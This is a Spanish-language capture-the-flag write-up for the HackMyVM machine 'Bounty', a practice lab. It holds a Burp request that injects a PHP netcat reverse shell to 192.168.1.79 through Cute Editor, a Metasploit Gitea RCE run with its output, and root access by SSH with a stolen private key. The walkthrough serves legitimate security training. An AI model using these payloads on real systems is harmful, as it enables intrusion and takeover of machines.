---
layout: post
title: Bounty - Hackmyvm
tags: [ctf, hackmyvm]
---

**Autor**: Sml \\
**Dificultad**: Medio

![img](/imgs/write-ups/hackmyvm/bounty/bounty.png#center)

## Reconocimiento

Lo primero, realizo un escaneo de los puertos abiertos en la máquina.

```
$ sudo nmap -p- 192.168.1.48 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-01 14:33 UTC
Nmap scan report for 192.168.1.48
Host is up (0.00012s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:67:D0:A4 (Oracle VirtualBox virtual NIC)
```

Utilizando curl para cargar la página principal del servidor, encuentro lo que parece un cronjob.

```
$ curl 192.168.1.48                             
* * * * * /usr/bin/php /var/www/html/document.html
```

Cada minuto se está utilizando PHP para ejecutar el código que haya en "document.html"

Tambien utilizo "nikto" para continuar con la enumeración.

```
nikto --host 192.168.1.48 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.48
+ Target Hostname:    192.168.1.48
+ Target Port:        80
+ Start Time:         2023-01-01 14:37:45 (GMT0)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0
+ Server leaks inodes via ETags, header found with file /, fields: 0x635104a1 0x33 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie PHPSESSID created without the httponly flag
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Multiple index files found: /index.html, /default.htm, /index.php
+ 7535 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2023-01-01 14:38:07 (GMT0) (22 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Lo importante de aquí es el archivo de index llamado "default.htm". Al navegar a ese archivo, me encuentro con un programa llamado "Cute editor".

![img](/imgs/write-ups/hackmyvm/bounty/bounty_1.png#center)

## Explotación

Navego a "Demo > Edit Static HTML" y utilizando burpsuite, subo una reverse shell al servidor.

![img](/imgs/write-ups/hackmyvm/bounty/bounty_2.png#center)

Para subir la shell:

- Navego primero a "Edit Static HTML".
- Sin escribir nada, pulso guardar.
- Edito la petición en burpsuite para subir la shell.
- Creo un listener y espero la conexión.

Petición en burp modificada:

```
POST /Edithtml.php?postback=true HTTP/1.1
Host: 192.168.1.48
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 117
Origin: http://192.168.1.48
Connection: close
Referer: http://192.168.1.48/Edithtml.php
Cookie: PHPSESSID=91fdqufp9aq0pcn9baa7csv3pg
Upgrade-Insecure-Requests: 1

Editor1=<?php+system('nc+-e+/bin/bash+192.168.1.79+1234');?>&Editor1ClientState=&Save.x=9&Save.y=6&textbox1=%3C%3Fphp%2Bsystem%28%27nc+-e+%2Fbin%2Fbash+192.168.1.79+1234%27%29%3B%3F%3E++++++++++++
```

Al cabo de un minuto, obtengo una shell como Hania gracias al cronjob visto anteriormente.

```
nc -lnvp 1234            
Connection from 192.168.1.48:33668
hania@bounty:~$ :)
```

## Escalado de privilegios

Hania tiene permiso para ejecutar el binario Gitea que se encuentra en /home/primavera como el usuario Primavera.

```
hania@bounty:~$ sudo -l
Matching Defaults entries for hania on bounty:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User hania may run the following commands on bounty:
    (primavera) NOPASSWD: /home/primavera/gitea \"\"
```

Tras ejecutarlo, se inicia un servicio de Gitea en el puerto 3000. Como se puede ver en la parte inferior izquierda del navegador, la versión de Gitea que se está ejecutando es la 1.16.6.

```
Impulsado por Gitea Versión: 1.16.6 Página: 0ms Plantilla: 0ms 
```
Para escalar privilegios, lo primero que hago es registrar un usuario nuevo en el servidor.

![img](/imgs/write-ups/hackmyvm/bounty/bounty_3.png#center)

Una vez creada la cuenta, utilizo metasploit para conseguir una sesión.

Es importante cambiar el target por defecto que tiene seleccionado metasploit a "Unix Command", ya que de otra forma no funcionará.

```
[...]
msf6 exploit(multi/http/gitea_git_fetch_rce) > set target Unix\ Command 
target => Unix Command
msf6 exploit(multi/http/gitea_git_fetch_rce) > run

[*] Started reverse TCP handler on 192.168.1.79:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version detected: 1.16.6
[*] Using URL: http://192.168.1.79:8080/
[*] Command shell session 1 opened (192.168.1.79:4444 -> 192.168.1.48:47888) at 2023-01-01 15:04:58 +0000
[*] Server stopped.

whoami
primavera
```

Una vez siendo Primavera, encuentro un nota en su directorio home.

```
$ cat note.txt    
Im the shadow admin. Congrats.
```

Suponiendo que Primavera es "admin", pruebo copiando la clave privada (id_rsa) de Primavera a mi máquina y después intento logearme mediante ssh.

Para mi sorpresa, sí funciona.

```
ssh root@192.168.1.48 -i primavera_id_rsa
[...]
Last login: Thu Oct 20 11:55:16 2022
root@bounty:~# :)
```

Muchas gracias  **Sml** por esta máquina.
